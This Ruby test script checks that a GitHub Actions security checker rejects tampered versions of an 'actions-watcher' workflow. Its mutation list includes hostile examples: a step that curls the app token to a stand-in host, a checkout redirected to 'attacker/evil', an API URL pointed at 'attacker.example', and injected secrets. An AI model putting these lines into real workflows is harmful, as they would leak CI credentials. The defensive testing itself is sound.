#!/usr/bin/env ruby

require "open3"
require "tempfile"

ROOT = File.expand_path("../..", __dir__)
CHECKER = File.join(ROOT, ".github/scripts/check-actions-watcher-routing.rb")
WORKFLOW = File.join(ROOT, ".github/workflows/actions-watcher.yml")
SOURCE = File.join(ROOT, "cmd/actions-watcher/github.go")

def run_checker(workflow, source)
  Tempfile.create(["actions-watcher", ".yml"]) do |workflow_file|
    Tempfile.create(["actions-watcher", ".go"]) do |source_file|
      workflow_file.write(workflow)
      workflow_file.flush
      source_file.write(source)
      source_file.flush
      stdout, stderr, status = Open3.capture3(
        {
          "ACTIONS_WATCHER_WORKFLOW_PATH" => workflow_file.path,
          "ACTIONS_WATCHER_SOURCE_PATH" => source_file.path
        },
        "ruby", CHECKER,
        chdir: ROOT
      )
      [stdout, stderr, status]
    end
  end
end

workflow = File.read(WORKFLOW)
source = File.read(SOURCE)
stdout, stderr, status = run_checker(workflow, source)
abort "baseline workflow failed: #{stdout}#{stderr}" unless status.success?

mutations = {
  "workflow allowlist" => [workflow.sub("  - Go vulnerability monitoring\n", ""), source],
  "workflow_run branch filter" => [workflow.sub("    branches:\n      - main\n", ""), source],
  "workflow_run source event filter" => [workflow.sub("workflow_run.event))", "workflow_run.event) || true)"), source],
  "cancellation policy" => [workflow.sub("cancel-in-progress: false", "cancel-in-progress: true"), source],
  "reconcile runner" => [workflow.sub("    runs-on: ubuntu-latest", "    runs-on: self-hosted"), source],
  "reconcile matrix fan-out" => [workflow.sub(
    "  reconcile:\n",
    "  reconcile:\n    strategy:\n      matrix:\n        shard: [one, two]\n"
  ), source],
  "checkout ref" => [workflow.sub("ref: main", 'ref: "${{ github.ref }}"'), source],
  "checkout action revision" => [workflow.sub("actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", "actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"), source],
  "checkout repository override" => [workflow.sub("          ref: main", "          ref: main\n          repository: attacker/evil"), source],
  "extra checkout input" => [workflow.sub("          persist-credentials: false", "          persist-credentials: false\n          token: ${{ secrets.EXTRA_TOKEN }}"), source],
  "setup-go action revision" => [workflow.sub("actions/setup-go@d8cbb8045d7f43706b9177cceb36c1f91a6644d5", "actions/setup-go@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"), source],
  "extra setup-go input" => [workflow.sub("          cache: true", "          cache: true\n          token: ${{ secrets.EXTRA_TOKEN }}"), source],
  "App token action revision" => [workflow.sub("actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510", "actions/create-github-app-token@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"), source],
  "App token private key override" => [workflow.sub("private-key: ${{ secrets.ACTIONS_WATCHER_PRIVATE_KEY }}", "private-key: ${{ secrets.OTHER_PRIVATE_KEY }}"), source],
  "token permission" => [workflow.sub("permission-issues: write", "permission-issues: read"), source],
  "extra token permission" => [workflow.sub("permission-metadata: read", "permission-metadata: read\n          permission-contents: write"), source],
  "workflow inherited secret" => [workflow.sub("permissions:\n  contents: read", "permissions:\n  contents: read\n\nenv:\n  EXTRA_SECRET: ${{ secrets.EXTRA_SECRET }}"), source],
  "job inherited secret" => [workflow.sub("    permissions:\n      contents: read", "    permissions:\n      contents: read\n    env:\n      EXTRA_SECRET: ${{ secrets.EXTRA_SECRET }}"), source],
  "extra step secret" => [workflow.sub("      - name: Set up Go", "      - name: Set up Go\n        env:\n          EXTRA_SECRET: ${{ secrets.EXTRA_SECRET }}"), source],
  "event name override" => [workflow.sub("GITHUB_EVENT_NAME: ${{ github.event_name }}", "GITHUB_EVENT_NAME: ${{ github.event.workflow_run.event }}"), source],
  "API URL override" => [workflow.sub("GITHUB_API_URL: ${{ github.api_url }}", "GITHUB_API_URL: https://attacker.example"), source],
  "extra reconciliation secret" => [workflow.sub("GITHUB_API_URL: ${{ github.api_url }}", "GITHUB_API_URL: ${{ github.api_url }}\n          EXTRA_SECRET: ${{ secrets.EXTRA_SECRET }}"), source],
  "activation timestamp wiring" => [workflow.sub("ACTIONS_WATCHER_ACTIVATED_AT: ${{ steps.activation.outputs.activated-at }}", "ACTIONS_WATCHER_ACTIVATED_AT: '2000-01-01T00:00:00Z'"), source],
  "extra token-consuming step" => [workflow.sub(
    "      - name: Derive watcher activation time",
    "      - name: Extra token consumer\n        env:\n          TOKEN: ${{ steps.app-token.outputs.token }}\n        run: curl -d \\\"$TOKEN\\\" https://example.invalid\n\n      - name: Derive watcher activation time"
  ), source],
  "extra command in an approved step" => [workflow.sub("set -euo pipefail", "set -euo pipefail\n          echo token"), source],
  "duplicate token step" => [workflow.sub(
    "      - name: Derive watcher activation time",
    "      - name: Extra token\n        uses: actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510\n        with:\n          permission-contents: write\n\n      - name: Derive watcher activation time"
  ), source],
  "failure conclusion policy" => [workflow, source.sub('conclusion == "timed_out"', 'conclusion == "cancelled"')],
  "triggering run readback" => [workflow, source.sub("GetWorkflowRunByID", "GetWorkflowRun")]
}

mutations.each do |name, (mutated_workflow, mutated_source)|
  _, error_output, result = run_checker(mutated_workflow, mutated_source)
  abort "checker accepted changed #{name}" if result.success?
  abort "checker did not identify changed #{name}" unless error_output.include?("FAIL:")
end

puts "actions watcher routing checker tests passed"
